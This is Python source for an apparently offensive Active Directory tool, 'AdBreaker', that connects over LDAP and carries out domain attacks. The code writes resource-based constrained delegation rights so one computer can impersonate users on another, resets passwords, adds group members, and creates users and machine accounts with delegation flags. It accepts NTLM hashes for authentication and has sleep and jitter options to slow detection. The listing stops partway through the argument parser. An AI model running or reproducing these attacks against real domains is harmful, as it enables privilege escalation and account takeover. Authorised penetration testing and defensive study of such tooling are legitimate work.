#!/usr/bin/env python

import os
import sys
import ldap3
import constants
import utils
import getpass
import ipdb
import json
import time 
import random
import struct
import logging
from ldap3 import Server, Connection, ALL, Tls, SASL, KERBEROS, EXTERNAL, AUTO_BIND_TLS_BEFORE_BIND, MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE, MODIFY_INCREMENT
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.uuid import bin_to_string
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.primitives import serialization
from datetime import datetime, timedelta
from functools import reduce


# attacks
# * reset password - done
# * add to group - done
# * create user - done
# * add a computer
# * write to computer object Resource Based Constrained Delegation - done
# * grant DCSync perms to user
# * read LAPs
# * read LAPS 2.0?



class AdBreaker:

    def __init__(self, host=None, target_ip=None, username=None, password=None, ssl=False, sslprotocol=None, port=None, delay=0, jitter=0, paged_size=500, logger=logging.Logger('AdBreaker'), raw=False, kerberos=False, 
                 no_password=False, start_tls=False, client_cert_file=None, client_key_file=None):
        self.logger = logger
        self.host = host
        self.kerberos = kerberos
        self.target_ip = target_ip if target_ip else host
        self.username = username 
        if kerberos:
            self.logger.debug('Kerberos option selected, will attempt to authenticate using configured Kerberos ccache')
            try:
                import gssapi
                cred = gssapi.Credentials(usage='initiate')
                self.username = cred.name.__bytes__().decode()
                self.logger.debug('Username from Kerberos: {}'.format(self.username))
            except Exception as e:
                self.logger.debug(f'Failed to determine username from Kerberos credential store using gssapi. Ensure gssapi is installed for Kerberos use. Exception:\n{e}')
                self.username = 'Kerberos {}'.format(os.environ["KRB5CCNAME"])
        elif (client_cert_file and client_key_file):
            self.logger.debug(f'Attempting to use client certificate file "{client_cert_file}" and client key file "{client_key_file}" for authentication')
        elif not username:
            self.authentication = None
        elif '\\' in username:
            self.logger.debug('Username provided in NTLM format, will attempt NTLM authentication')
            self.authentication = 'NTLM'
        else:
            self.logger.debug('Using SIMPLE authentication')
            self.authentication = 'SIMPLE'
        self.password = password 
        self.no_password = no_password
        if self.no_password and self.username:
            if self.authentication == 'NTLM': # password to empty NTLM string, ldap3 wont allow you to specify no password but will allow emtpy password hash
                self.password = 'AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0' 
                self.logger.debug('No password setting specified, attempting NTLM authentication using empty password')
            else: # empty password wont work for SIMPLE binds
                raise Exception('Passwordless authentication not supported using SIMPLE bind, specify your login name as DOMAIN\\username to use NTLM authentication')
        self.ssl = ssl 
        self.raw = raw
        self.port = port if port else 636 if self.ssl else 389
        self.delay = delay
        self.jitter = jitter
        if sslprotocol:
            spv = self.get_supported_tls()
            if sslprotocol in spv:
                self.sslprotocol = spv[sslprotocol]
            else:
                raise Exception('Bad SSL Protocol value provided, choose one from: {}'.format(', '.join(list(spv))))
        else:
            self.sslprotocol = None
        
        self.start_tls = start_tls
        self.client_cert_file = client_cert_file
        self.client_key_file = client_key_file
        
        self.bh_parent_map = {}
        self.bh_gpo_map = {}
        self.bh_cert_temp_map = {}
        self.bh_member_map = {}
        self.bh_computer_map = {}
        self.bh_core_domain = ''
        self.post_process_data = True
        self.multi_field = ['dSCorePropagationData', 'objectClass']
        self.datetime_format = '%Y-%m-%d %H:%M:%S.%f %Z %z'
        self.timestamp = False
        self.paged_size = paged_size

        # "Security descriptor flags" control 1.2.840.113556.1.4.801
        # owner 0x1, group 0x2, DACL 0x4, SACL 0x8
        # LDAP_SERVER_SD_FLAGS_OID - 0x07 flag value, queries for all values in nTSecurityDescriptor apart from SACL, 0x0f includes SACL
        self.read_unpriv_sd_control = [('1.2.840.113556.1.4.801', True, "\x30\x03\x02\x01\x07")]  
        self.read_priv_sd_control = [('1.2.840.113556.1.4.801', True, "\x30\x03\x02\x01\x0f")]

        self.domainLT = {}
        self.domainLTNB = {}
        self.convert_binary = True

        # impacket LDAP access mask structures have values for set (not read) operations for these masks, so we override
        # https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2
        self.am_overrides = {
            'GENERIC_READ' : 0x00020094,
            'GENERIC_WRITE': 0x00020028,
            'GENERIC_EXECUTE':0x00020004,
            'GENERIC_ALL': 0x000F01FF
        }

        self.sd_fields = ['nTSecurityDescriptor', 'msDS-GroupMSAMembership', 'msDS-AllowedToActOnBehalfOfOtherIdentity']
        self.sid_fields = ['securityIdentifier', 'sIDHistory']

        self.ace_flags = self.get_ace_flag_constants()
        self.access_masks = self.get_access_mask_constants()
        self.ace_data_flags = self.get_ace_data_flag_constants()
        self.object_types = dict(constants.OBJECT_TYPES)
        self.sidLT = constants.WELL_KNOWN_SIDS
        self.schema = {}
        self.output_timestamp = None
        self.start_time = None 
        self.uac_default_flags = [
            'NORMAL_ACCOUNT'
        ]



    def connect(self):
        if not self.target_ip:
            raise Exception('No host provided')
        
        if self.client_key_file and self.client_cert_file:
            tls_object = Tls(validate=0, version=self.sslprotocol, local_private_key_file=self.client_key_file, local_certificate_file=self.client_cert_file)
        else:
            tls_object = Tls(validate=0, version=self.sslprotocol)

        if self.ssl:
            self.server = Server(self.target_ip, get_info=ALL, port=self.port, use_ssl=True, tls=tls_object)
        else:
            if self.start_tls or (self.client_key_file and self.client_cert_file):
                self.server = Server(self.target_ip, get_info=ALL, port=self.port, tls=tls_object)
            else:
                self.server = Server(self.target_ip, get_info=ALL, port=self.port)
        
        # host needs to be a domain name for kerberos
        # we ensure this is the case even if we connect to an IP via the sasl_credentials with the host specified as var 1 in Connection
        if self.kerberos:
            self.logger.debug(f'Attempting to perform Kerberos connection to LDAP server {self.server} with bind host name {self.host}')
            self.connection = Connection(self.server, sasl_credentials=(self.host,), authentication=SASL, sasl_mechanism=KERBEROS) 
        elif self.client_key_file and self.client_cert_file and self.ssl:
            self.logger.debug(f'Attempting to authenticate to LDAP server {self.server} using provided certificate with SSL bind')
            self.connection = Connection(self.server) 
        elif (self.client_key_file and self.client_cert_file):
            self.logger.debug(f'Attempting to perform connection to LDAP server {self.server} with STARTTLS')
            self.connection = Connection(self.server, authentication=SASL, sasl_mechanism=EXTERNAL, auto_bind=AUTO_BIND_TLS_BEFORE_BIND)
        else:
            self.logger.debug(f'Attempting to perform connection to LDAP server {self.server}')
            self.connection = Connection(self.server, user=self.username, password=self.password, authentication=self.authentication)

        if self.start_tls and not (self.client_key_file and self.client_cert_file):
            self.logger.debug(f'Attempting to START_TLS on connection...')
            try:
                self.connection.start_tls()
            except Exception as e:
                self.logger.debug(f'Exception during START_TLS operation: {str(e)}')
                sys.exit(1)

        # need to open and not rebind when relying on TLS connection for authentication
        if (self.client_key_file and self.client_cert_file) and self.ssl:
            self.connection.open() 
        # the connection auto binds when using certificate auth on the non SSL LDAP port
        elif not (self.client_key_file and self.client_cert_file):
            try:
                bindresult = self.connection.bind()
            except Exception as e:
                print('An error occurred when binding to the LDAP service:\n{}\n'.format(e))
                print('For Kerberos errors try manually specifying the realm, ensuring that forged ccache tickets use upper case for the domain and removing conflicting hosts file entries.')
                sys.exit(1)

            if not bindresult:
                raise Exception('An error occurred when attempting to bind to the LDAP server: {}'.format(', '.join(['{} : {}' .format(a, self.connection.result[a]) for a in  self.connection.result])))
        
        # Check to see if server is a Global Catalog server
        if not 'TRUE' in self.server.info.other.get('isGlobalCatalogReady'):
            self.logger.warning('WARNING: Server is not a global catalog, results may be incomplete...')
        else:
            self.logger.info('Target server is a Global Catalog server')
        self.root = self.server.info.other['defaultNamingContext'][0]
        self.logger.info('Authenticated as user: {}'.format(self.whoami()))


    def _parse_convert_val(self, value):
        if isinstance(value, datetime):
            if self.timestamp:
                return value.timestamp()
            else:
                return value.strftime(self.datetime_format)
        elif isinstance(value, timedelta):
            return str(value)
        elif isinstance(value, list):
            return [self._parse_convert_val(a) for a in value]
        else:
            return value

    # convert PKI period format, based on bh code from below
    # https://github.com/BloodHoundAD/SharpHoundCommon/blob/80fc5c0deaedf8d39d62c6f85d6fd58fd90a840f/src/CommonLib/Processors/LDAPPropertyProcessor.cs#L665
    def _convert_pki_period(self, value):
        up = struct.unpack('<q', value)[0] * -.0000001
        if (up % 31536000 == 0 and up / 31536000 >=1): # years 
            if up == 31536000:
                return '1 year'
            return '{} years'.format(int(up / 31536000))
        if (up % 2592000 == 0 and up / 2592000 >=1): # months 
            if up == 2592000:
                return '1 month'
            return '{} months'.format(int(up / 2592000))
        if (up % 604800 == 0 and up / 604800 >=1): # weeks
            if up == 604800:
                return '1 week'
            return '{} weeks'.format(int(up / 604800))
        if (up % 86400 == 0 and up / 86400 >=1): # day
            if up == 86400:
                return '1 day'
            return '{} days'.format(timedelta(seconds=up).days)
        if (up % 3600 == 0 and up / 3600 >=1): # hours
            if up == 3600:
                return '1 hour'
            return '{} hours'.format(int(up / 3600))
        
        return ''


    def _combine_flags(self, flag_dict: dict, flag_values: list) -> int:
        return reduce(lambda x,y: x|y, [flag_dict[a] for a in flag_values], 0)

    def _encode_password(self, password: str) -> bytes:
        return '"{}"'.format(password).encode('utf-16-le')


    def get_allowed_to_act(self, dn):
        '''Get target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute'''

        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'sAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'], parse_security_fields=False)
        if not results:
            self.logger.error(f'Could not find object {dn}')
            return 

        try:
            sd_data = results[0].get('msDS-AllowedToActOnBehalfOfOtherIdentity', None)
            if not isinstance(sd_data, bytes):
                return utils.create_empty_sd(), results[0]
            sd = SR_SECURITY_DESCRIPTOR(data=sd_data)
            if len(sd['Dacl'].aces) > 0:
                for ace in sd['Dacl'].aces:
                    sid = ace['Ace']['Sid'].formatCanonical()
                    accountName = (lambda x, y: x.get(y) if x else None)(self.lookup_by_sid(sid), 'sAMAccountName')
                    self.logger.info(f'{accountName} ({sid}) is allowed to act')
            else:
                self.logger.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
        except IndexError:
            self.logger.info('Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty')
            sd = utils.create_empty_sd()
        return sd, results[0]


    def write_allowed_to_act(self, target_computer_dn: str, acting_computer_dn: str):
        '''Write allowed to act'''

        delegate_from_sid = self.lookup_by_distinguished_name(acting_computer_dn).get('objectSid', None)
        if not delegate_from_sid:
            self.logger.error(f'Could not find acting computer with DN {acting_computer_dn}')
            return

        sd, delegate_to_object = self.get_allowed_to_act(target_computer_dn)

        if delegate_from_sid not in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces.append(utils.create_allow_ace(delegate_from_sid))
            result = self.modify_record(target_computer_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(MODIFY_REPLACE, [sd.getData()])]})
            if result['result'] == 0:
                self.logger.info('Delegation rights modified successfully!')
                self.logger.info(f'{acting_computer_dn} can now impersonate users on {target_computer_dn} via S4U2Proxy')
            else:
                if result['result'] == 50:
                    self.logger.error(f'Could not modify object, the server reports insufficient rights: {result["message"]}')
                elif result['result'] == 19:
                    self.logger.error(f'Could not modify object, the server reports a constrained violation: {result["message"]}')
                else:
                    self.logger.error(f'The server returned an error: {result["message"]}')
        else:
            self.logger.info(f'{acting_computer_dn} can already impersonate users on {target_computer_dn} via S4U2Proxy - not modifying!')

        return



    def remove_allowed_to_act(self, target_computer_dn: str, acting_computer_dn: str):
        '''Remove allowed to act'''

        delegate_from_sid = self.lookup_by_distinguished_name(acting_computer_dn).get('objectSid', None)
        if not delegate_from_sid:
            self.logger.error(f'Could not find acting computer with DN {acting_computer_dn}')
            return

        sd, delegate_to_object = self.get_allowed_to_act(target_computer_dn)

        if delegate_from_sid in [ ace['Ace']['Sid'].formatCanonical() for ace in sd['Dacl'].aces ]:
            sd['Dacl'].aces = [ace for ace in sd['Dacl'].aces if delegate_from_sid != ace['Ace']['Sid'].formatCanonical()]
            result = self.modify_record(target_computer_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(MODIFY_REPLACE, [sd.getData()])]})
            if result['result'] == 0:
                self.logger.info('Delegation rights removed successfully!')
                self.logger.info(f'{acting_computer_dn} has had its rights to impersonate {target_computer_dn} via S4U2Proxy removed')
            else:
                if result['result'] == 50:
                    self.logger.error(f'Could not modify object, the server reports insufficient rights: {result["message"]}')
                elif result['result'] == 19:
                    self.logger.error(f'Could not modify object, the server reports a constrained violation: {result["message"]}')
                else:
                    self.logger.error(f'The server returned an error: {result["message"]}')
        else:
            self.logger.info(f'{acting_computer_dn} was already not able to impersonate {target_computer_dn} via S4U2Proxy - not modifying!')

        return



    def add_record(self, dn: str, object_class: str|list, attributes: dict, controls: list=None):
        self.connection.add(dn=dn, object_class=object_class, attributes=attributes, controls=controls)
        return self.connection.result
        

    def modify_record(self, dn: str, changes: dict, controls: list=None):
        self.connection.modify(dn=dn, changes=changes, controls=controls)
        return self.connection.result


    # https://serverfault.com/a/423347 - 
    # However, you need to send both a delete LDAP change with the correct old password, as well as an add type change with the new password, in the same operation.
    # not working when used with old pwd?....
    def change_password1(self, dn: str, new_password: str, old_password: str=None):
        self.connection.extend.microsoft.modify_password(user=dn, new_password=new_password, old_password=old_password)
        return self.connection.result

    def lookup_by_account_name(self, account_name: str, log: bool=False):
        results = self.run_query(f'(sAMAccountName={account_name})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
        return results[0] if len(results) == 1 else None

    def lookup_by_distinguished_name(self, dn: str, log: bool=False):
        results = self.run_query(f'(distinguishedName={dn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
        return results[0] if len(results) == 1 else None

    def lookup_by_upn(self, upn: str, log: bool=False):
        results = self.run_query(f'(userPrincipalName={upn})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
        return results[0] if len(results) == 1 else None

    def lookup_by_sid(self, sid: str, log: bool=False):
        results = self.run_query(f'(objectSid={sid})', attributes=['distinguishedName', 'objectSid', 'sAMAccountName', 'userPrincipalName'], log=log)
        return results[0] if len(results) == 1 else None


    def add_members_to_groups(self, members: str|list, groups: str|list):
        self.connection.extend.microsoft.add_members_to_groups(members, groups)
        return self.connection.result

    def remove_members_from_groups(self, members: str|list, groups: str|list):
        self.connection.extend.microsoft.remove_members_from_groups(members, groups)
        return self.connection.result


    def change_password(self, dn: str, old_password: str, new_password: str):
        return self.modify_record(dn, {'unicodePwd': [(MODIFY_DELETE, [self._encode_password(old_password)]), (MODIFY_ADD, [self._encode_password(new_password)])]})


    def reset_password(self, dn: str, password: str):
        if not self.ssl or self.start_tls or self.client_cert_file:
            self.logger.warning('Connection is not via TLS, password reset likely to fail')
        return self.modify_record(dn, {'unicodePwd': [(MODIFY_REPLACE, [self._encode_password(password)])]})


    # pwdlastset to 0 to force pwd change
    def create_user(self, dn: str, password: str, given_name: str, surname: str, account_name: str, user_principal_name: str='', display_name: str=None, mail: str=None, uac_flags: list=None):
        objectClass = ['user']
        uac_flags = uac_flags if uac_flags else self.uac_default_flags
        # TODO: verify UAC flags are accurate
        # Setting of sAMAccountType?? doesnt seem to work on create, may not be necessary anyway for normal accounts as default is correct???
        uac = self._combine_flags(constants.FLAGS['userAccountControl'], uac_flags)
        attributes = {
            'displayName': display_name if display_name else f'{given_name} {surname}',
            'givenName': given_name,
            'mail': mail if mail else f'{given_name}.{surname}@{self.get_domain_dns_name()}'.lower(),
            'sAMAccountName': account_name,
            'sn': surname,
            'unicodePwd': self._encode_password(password),
            'userPrincipalName': user_principal_name if user_principal_name else f'{given_name}.{surname}@{self.get_domain_dns_name()}'.lower(),
        }

        self.add_record(dn, object_class=objectClass, attributes=attributes)
        
        if 'result' in self.connection.result and self.connection.result['result'] == 0:
            results = [self.connection.result]
            # uac needs to be applied after account exists and password is set
            self.modify_record(dn, changes={'userAccountControl': [(MODIFY_REPLACE, uac)]})
            results += [self.connection.result]
            return results
        else:
            return self.connection.result



    def add_computer(self, dn:str, computername: str, password: str, constrained_delegations: list=[]):

        
        ## Default computer SPNs
        spns = [
        #    'HOST/%s' % computerHostname,
        #    'HOST/%s.%s' % (computerHostname, self.__domain),
        #    'RestrictedKrbHost/%s' % computerHostname,
        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
        ]

        attributes = {
        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
            'userAccountControl': 0x1000,
            'servicePrincipalName': spns,
        #    'sAMAccountName': self.__computerName,
            'unicodePwd': self._encode_password(password)
        }
        
        # Add constrained delegations fields to the computer
        if constrained_delegations and len(constrained_delegations) > 0:
            # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
            # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
            attributes['userAccountControl'] = 0x1000000|0x1000
            # Set the list of services authorized (format: protocol/FQDNserver)
            attributes['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
            self.logger.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)


        result = self.add_record(dn, object_class=['top','person','organizationalPerson','user','computer'], attributes=attributes)

        if not result:
            if result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
                error_code = int(result['message'].split(':')[0].strip(), 16)
                if error_code == 0x216D:
                    raise Exception("User machine quota exceeded!")
                else:
                    raise Exception(str(self.ldapConn.result))
            elif result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
                raise Exception("User doesn't have right to create a machine account!")
            elif result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
                raise Exception("User doesn't have right to create constrained delegations!")
            else:
                raise Exception(str(result))
        else:
            self.logger.info(f'Successfully added machine account {computername} with password {password}.')




        #if self.__computerName is not None:
        #    if self.LDAPComputerExists(self.ldapConn, self.__computerName):
        #        raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
        #else:
        #    while True:
        #        self.__computerName = self.generateComputerName()
        #        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
        #            break


        #computerHostname = self.__computerName[:-1]
        #computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))

        ## Default computer SPNs
        #spns = [
        #    'HOST/%s' % computerHostname,
        #    'HOST/%s.%s' % (computerHostname, self.__domain),
        #    'RestrictedKrbHost/%s' % computerHostname,
        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
        #]
        #ucd = {
        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
        #    'userAccountControl': 0x1000,
        #    'servicePrincipalName': spns,
        #    'sAMAccountName': self.__computerName,
        #    'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
        #}

        ## Add constrained delegations fields to the computer
        #if constrained_delegations and len(constrained_delegations) > 0:
        #    # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
        #    # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
        #    ucd['userAccountControl'] = 0x1000000|0x1000
        #    # Set the list of services authorized (format: protocol/FQDNserver)
        #    ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
        #    logging.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)

        #res = self.ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
        #if not res:
        #    if self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
        #        error_code = int(self.ldapConn.result['message'].split(':')[0].strip(), 16)
        #        if error_code == 0x216D:
        #            raise Exception("User machine quota exceeded!")
        #        else:
        #            raise Exception(str(self.ldapConn.result))
        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
        #        raise Exception("User doesn't have right to create a machine account!")
        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
        #        raise Exception("User doesn't have right to create constrained delegations!")
        #    else:
        #        raise Exception(str(self.ldapConn.result))
        #else:
        #    logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))






    def get_ace_flag_constants(self):
        return {a:ACE.__dict__[a] for a in ACE.__dict__ if a == a.upper()} 

    def get_access_mask_constants(self):
        access_mask = {a:ACCESS_MASK.__dict__[a] for a in ACCESS_MASK.__dict__ if a == a.upper() }
        access_mask.update({a:ACCESS_ALLOWED_OBJECT_ACE.__dict__[a] for a in ACCESS_ALLOWED_OBJECT_ACE.__dict__ if a.startswith('ADS_')})   
        access_mask.update(self.am_overrides)
        return access_mask

    def get_ace_data_flag_constants(self):
        return {a:ACCESS_ALLOWED_OBJECT_ACE.__dict__[a] for a in ACCESS_ALLOWED_OBJECT_ACE.__dict__ if 'PRESENT' in a}

    def get_domain_sid(self, sid) -> str:
        return '-'.join(sid.split('-')[:-1])

    def get_domain_dns_name(self) -> str:
        return self.server.info.other['ldapServiceName'][0].split('@')[-1].lower()

    def get_uac_flags(self) -> list:
        return list(constants.FLAGS['userAccountControl'].keys())

    def hasFlag(self, flag, value):
        return True if flag & value == flag else False


    def parse_records(self, gen):
        out = []
        counter=0
        for record in gen:
            if 'type' in record and record['type'] == 'searchResEntry' and 'attributes' in record:
                orecord = record['attributes']
                for key in orecord:
                    orecord[key] = self._parse_convert_val(orecord[key])

                for entry in constants.FLAGS:
                    if entry in orecord:
                        # msPKI-Private-Key-Flag
                        orecord['{}Flags'.format(entry)] = [a for a in constants.FLAGS[entry] if self.hasFlag(constants.FLAGS[entry][a], orecord[entry])]

                for entry in constants.LOOKUPS:
                    if entry in orecord:
                        orecord['{}Resolved'.format(entry)] = constants.LOOKUPS[entry][orecord[entry]]

                for entry in ['pKIExpirationPeriod', 'pKIOverlapPeriod']:
                    if entry in orecord:
                        if self.raw:
                            orecord['{}_raw'.format(entry)] = orecord[entry]
                        orecord[entry] = self._convert_pki_period(orecord[entry])

                out.append(orecord)

                # delay between each page of records if sleep is configured
                if self.delay:
                    counter+=1
                    if counter==self.paged_size:
                        mydelay = self.delay
                        if self.jitter:
                            myjit = random.randint(1, self.jitter)
                            mydelay = self.delay + myjit
                            self.logger.debug('Adding {} seconds of jitter to delay'.format(myjit))
                        self.logger.info('Sleeping for {} seconds during paging operation as per configured setting'.format(mydelay))
                        time.sleep(mydelay)
                        counter=0

        return out

    #https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7d4dac05-9cef-4563-a058-f108abecce1d?redirectedfrom=MSDN
    #https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/990fb975-ab31-4bc1-8b75-5da132cd4584
    def parseSecurityDescriptor(self, nTSecurityDescriptor, resolve_sid: bool=True):
        out = {}
        sd = SR_SECURITY_DESCRIPTOR()
        sd.fromString(nTSecurityDescriptor)
        out['IsACLProtected'] = int(bin(sd['Control'])[2:][3]) == 1 # 3 PD DACL Protected from inherit operations
        # Get-ADUser -Filter * -Properties nTSecurityDescriptor | ?{ $_.nTSecurityDescriptor.AreAccessRulesProtected -eq "True" }
        if sd['Control']:
            out['Control'] = sd['Control']
        if sd['OwnerSid']:
            out['OwnerSid'] = sd['OwnerSid'].formatCanonical()
            if resolve_sid and out['OwnerSid'] in self.sidLT:
                out['OwnerName'] = self.sidLT[out['OwnerSid']][0]
        if sd['GroupSid']:
            out['GroupSid'] = sd['GroupSid'].formatCanonical()
            if resolve_sid and out['GroupSid'] in self.sidLT:
                out['GroupName'] = self.sidLT[out['GroupSid']][0]
        for acl_list in ['Dacl', 'Sacl']:
            if sd[acl_list]:
                out[f'{acl_list}s'] = []
                for ace in sd[acl_list]['Data']:
                    dacl = {'Type' : ace['TypeName']}
                    dacl['Sid'] = ace['Ace']['Sid'].formatCanonical()
                    if resolve_sid and dacl['Sid'] in self.sidLT:
                        d = [self.sidLT[dacl['Sid']][0]]
                        domainsid = self.get_domain_sid(dacl['Sid'])
                        if domainsid in self.domainLTNB:
                            d.append(self.domainLTNB[domainsid])
                        elif dacl['Sid'].startswith('S-1-5-32-'):
                            d.append('Builtin')
                        dacl['ResolvedSidName'] = '\\'.join(d[::-1])
                        dacl['Foreign'] = False

                    dacl['Flags'] = []
                    for flag in self.ace_flags:
                        if ace.hasFlag(self.ace_flags[flag]):
                            dacl['Flags'].append(flag)
                    if dacl['Type'] == 'ACCESS_ALLOWED_OBJECT_ACE':
                        dacl['Ace_Data_Flags'] = []
                        for dataflag in self.ace_data_flags:
                            if ace['Ace'].hasFlag(self.ace_data_flags[dataflag]):
                                dacl['Ace_Data_Flags'].append(dataflag)

                    dacl['Mask'] = ace['Ace']['Mask']['Mask']

                    dacl['Privs'] = []
                    for priv in self.access_masks:
                        if ace['Ace']['Mask'].hasPriv(self.access_masks[priv]):
                            dacl['Privs'].append(priv)
                    if 'ObjectType' in ace['Ace'].fields and len(ace['Ace']['ObjectType']) > 0:
                        type_guid = bin_to_string(ace['Ace']['ObjectType']).lower()
                        if type_guid in self.object_types:
                            dacl['ControlObjectType'] = self.object_types[type_guid]
                        else:
                            dacl['ControlObjectType'] = type_guid
                    if 'InheritedObjectType' in ace['Ace'].fields and len(ace['Ace']['InheritedObjectType']) > 0:
                        type_guid = bin_to_string(ace['Ace']['InheritedObjectType']).lower()
                        if type_guid in self.object_types:
                            dacl['InheritableObjectType'] = self.object_types[type_guid]
                        else:
                            dacl['InheritableObjectType'] = type_guid
                    out[f'{acl_list}s'].append(dacl)

        return out


    def parse_security_fields(self, records):
        for record in records:
            sd_fields = [a for a in record if a in self.sd_fields]
            if sd_fields:
                for field in sd_fields:
                    if self.raw:
                        record[f'{field}_raw'] = record[field]
                    record[field] = self.parseSecurityDescriptor(record[field])

            si_fields = [a for a in record if a in self.sid_fields]
            if si_fields:
                for field in si_fields:
                    if isinstance(record[field], bytes):
                        record[field] = LDAP_SID(record[field]).formatCanonical()
                    elif isinstance(record[field], list): 
                        items = []
                        for sid in record[field]:
                            items += [LDAP_SID(sid).formatCanonical()]                                
                        record[field] = items
        return records



    def run_query(self, query: str, base: str='', attributes: str=ldap3.ALL_ATTRIBUTES, read_unpriv_sd_control: bool=True, read_priv_sd_control: bool=False, controls: list=[], parse_security_fields: bool=True, log: bool=True):
        if log:
            self.logger.info(f'Running query {query}')

        if not base:
            base = self.root
        search_params = {
            'attributes': attributes,
            'paged_size': self.paged_size,
            'generator': True
        }

        if read_priv_sd_control:
            search_params['controls'] = self.read_priv_sd_control
        elif read_unpriv_sd_control:
            search_params['controls'] = self.read_unpriv_sd_control
        
        if controls:
            if not 'controls' in search_params:
                search_params['controls'] = []
            search_params['controls'] += controls
            
        gen = self.connection.extend.standard.paged_search(base, query, **search_params)
        data = self.parse_records(gen)
        if parse_security_fields:
            data = self.parse_security_fields(data)
        return data


    def whoami(self) -> str:
        try:
            who = (lambda x: x if x else 'Anonymous')(self.connection.extend.standard.who_am_i())
            return who.replace('u:', '', 1) if who.startswith('u:') else who
        except Exception as e:
            return f'Exception determining connected user: {str(e)}'





def command_line():
    parser = utils.MyParser()
    input_arg_group = parser.add_argument_group('Operation')
    mgroup = input_arg_group.add_mutually_exclusive_group(required=True)
    mgroup.add_argument('-d', '--domain-controller', type=str, help='Domain controller address to connect to if performing a fresh collection. If using Kerberos auth, provide a domain name')
    
    
    input_arg_group.add_argument('-target-ip', type=str, default=None, help='IP Address of the target machine. If omitted it will use whatever was specified as target')
    input_arg_group.add_argument('-ssl', action='store_true', help='Force use of SSL for LDAP connection')
    input_arg_group.add_argument('-ssl_protocol', type=str, default=None, help='Use a specific SSL/TLS protocol version')
    input_arg_group.add_argument('-start_tls', action='store_true', help='Attempt to upgrade the plain text LDAP port/connection to SSL (post authentication)')
    input_arg_group.add_argument('-sleep', type=int, default=0, help='Time in seconds to sleep between each paged LDAP request and each enumeration method')
    input_arg_group.add_argument('-jitter', type=int, default=0, help='Set to a positive integer to add a random value of up to that many seconds to the sleep delay')
    input_arg_group.add_argument('-pagesize', type=int, default=500, help='Page size for LDAP requests')
    input_arg_group.add_argument('-port', type=int, default=None, help='Port to connect to. Determined automatically if not specified.')
    input_arg_group.add_argument('-query-config', type=str, default=None, help='Provide JSON config file that defines custom LDAP queries and attribute lists for each query category, overriding other settings')
    input_arg_group.add_argument('-bh-attributes', action='store_true', help='Collect object attributes compatible with BloodHound with object props only')
    input_arg_group.add_argument('-attributes', type=str, default=None, help='Provide comma seperated list of object attributes to return for all queries. Best used for custom queries as some attributes are required for normal operation.')

    auth_arg_group = parser.add_argument_group('Authentication')
    agroup = auth_arg_group.add_mutually_exclusive_group()
    agroup.add_argument('-u', '--username', type=str, default = '', help='Username, use DOMAIN\\username format for NTLM authentication, user@domain for SIMPLE auth')
    agroup.add_argument('-k', '--kerberos', action='store_true', help='Authenticate using Kerberos via KRB5CCNAME environment variable')
    agroup_cert = agroup.add_mutually_exclusive_group()
    agroup_cert.add_argument('-cc', '--pem_client_cert', type=str, default = None, help='Authenticate using client certificate and key in PEM format - PEM cert file')
    agroup.add_argument('-ck', '--pem_client_key', type=str, default = None, help='Authenticate using client certificate and key in PEM format - PEM key file')
    agroup_cert.add_argument('-pc', '--pkcs12_client_cert', type=str, default = None, help='Authenticate using client certificate and key in (passwordless) PKCS12 format')

    auth_arg_group.add_argument('-no-password', action='store_true', help='Attempt to logon with an empty password (requires username in NTLM format)')
    auth_arg_group.add_argument('-password', type=str,  default='', help='Password, hashes also accepted for NTLM. Will be prompted for if not provided and no-password not set')
